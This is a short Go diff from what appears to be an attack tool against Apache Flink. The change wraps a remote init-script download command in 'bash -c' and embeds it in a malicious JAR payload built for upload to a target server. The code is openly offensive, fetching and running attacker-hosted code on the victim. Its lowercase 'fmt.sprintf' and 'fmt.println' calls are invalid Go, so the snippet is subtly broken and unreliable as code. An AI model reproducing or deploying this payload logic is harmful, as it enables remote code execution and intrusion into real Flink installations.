@@ -48,8 +48,9 @@ uploadJar := func() {
 
     initUrl := attackScript.downloadInitUrl(host,port,AttackInitScriptName)
     initDownloadCmd := attackScript.initCmdForLinux(initUrl,ApacheFlinkAttackType)
+    cmd := fmt.sprintf("bash,-c,%s",initDownloadCmd)
 
-    jarFilePath := attackScript.makeJarAttackPayload(initDownloadCmd)
+    jarFilePath := attackScript.makeJarAttackPayload(cmd)
 
     if jarFilePath == "" {
         fmt.println("create jar upload file failed...................")
